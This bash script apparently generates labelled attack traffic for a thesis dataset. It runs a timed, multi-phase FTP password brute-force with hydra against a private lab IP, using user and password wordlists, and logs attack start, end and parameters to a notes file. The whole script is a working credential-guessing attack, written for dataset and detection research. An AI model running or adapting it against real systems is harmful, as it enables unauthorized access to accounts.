#!/usr/bin/env bash
set -euo pipefail

RUN_NAME="$1"; NOTES_FILE="$2"; TARGET_IP="192.168.9.131"
SEED=${SEED:-$RANDOM}; RANDOM=$SEED

# ========== 可调参数 ==========
THREADS=${THREADS:-16}
TIMEOUT_PER_BATCH=${TIMEOUT_PER_BATCH:-15}
ATTACK_DURATION=${ATTACK_DURATION:-300}
USER_FILE="$HOME/thesis_dataset/scripts/wordlists/users.txt"
PASS_FILE="$HOME/thesis_dataset/scripts/wordlists/pass_massive.txt"
TEMP_PASS="/tmp/ftp_temp_pass_${SEED}.txt"
PROFILE_ID="${PROFILE_ID:-}"
# ==============================

trap 'rm -f "$TEMP_PASS"' EXIT

TOTAL_PASS=$(wc -l < "$PASS_FILE")
LINE_INDEX=1

# ========== notes 元信息 ==========
echo "RUN_ID=$RUN_NAME" | tee -a "$NOTES_FILE"
echo "RANDOM_SEED=$SEED" | tee -a "$NOTES_FILE"
echo "ATTACK_CATEGORY=brute_force" | tee -a "$NOTES_FILE"
echo "ATTACK_SUBTYPE=ftp" | tee -a "$NOTES_FILE"
echo "PROFILE_ID=$PROFILE_ID" | tee -a "$NOTES_FILE"
echo "PROTOCOL=ftp" | tee -a "$NOTES_FILE"
echo "TOOL=hydra_optimized" | tee -a "$NOTES_FILE"
echo "THREADS=$THREADS" | tee -a "$NOTES_FILE"
echo "TIMEOUT_PER_BATCH=$TIMEOUT_PER_BATCH" | tee -a "$NOTES_FILE"
echo "ATTACK_DURATION=$ATTACK_DURATION" | tee -a "$NOTES_FILE"
# ==================================

echo "等待 9 秒前置静默期..."
sleep 9

echo "ATTACK_START $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
START_TIME=$SECONDS

while [ $((SECONDS - START_TIME)) -lt $ATTACK_DURATION ]; do
    CURRENT_TIME=$((SECONDS - START_TIME))
    if [ $CURRENT_TIME -lt 60 ]; then
        MULTIPLIER=2
        SLEEP_TIME=$(( (RANDOM % 2) + 1 ))
    elif [ $CURRENT_TIME -lt 240 ]; then
        MULTIPLIER=$(( (RANDOM % 5) + 8 ))
        SLEEP_TIME=$(( RANDOM % 3 ))
    else
        MULTIPLIER=2
        SLEEP_TIME=$(( (RANDOM % 2) + 2 ))
    fi

    CHUNK_SIZE=$(( THREADS * MULTIPLIER * 2 ))
    if [ $LINE_INDEX -gt $TOTAL_PASS ]; then
        LINE_INDEX=1
    fi
    sed -n "${LINE_INDEX},$((LINE_INDEX + CHUNK_SIZE - 1))p" "$PASS_FILE" > "$TEMP_PASS"
    LINE_INDEX=$((LINE_INDEX + CHUNK_SIZE))
    TARGET_USER=$(shuf -n 1 "$USER_FILE")

    echo "[*] ${CURRENT_TIME}s: protocol=ftp threads=$THREADS chunk=$CHUNK_SIZE user=$TARGET_USER"

    timeout "$TIMEOUT_PER_BATCH" hydra \
        -l "$TARGET_USER" \
        -P "$TEMP_PASS" \
        -t "$THREADS" \
        -W 0.5 \
        "ftp://$TARGET_IP" >> "/tmp/ftp_brute_debug_${RUN_NAME}.log" 2>&1 || true

    sleep "$SLEEP_TIME"
done

echo "ATTACK_END $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
echo "MODULE_SUMMARY=ftp_failed_password_bruteforce_v2" | tee -a "$NOTES_FILE"
echo "等待 9 秒后置静默期..."
sleep 9
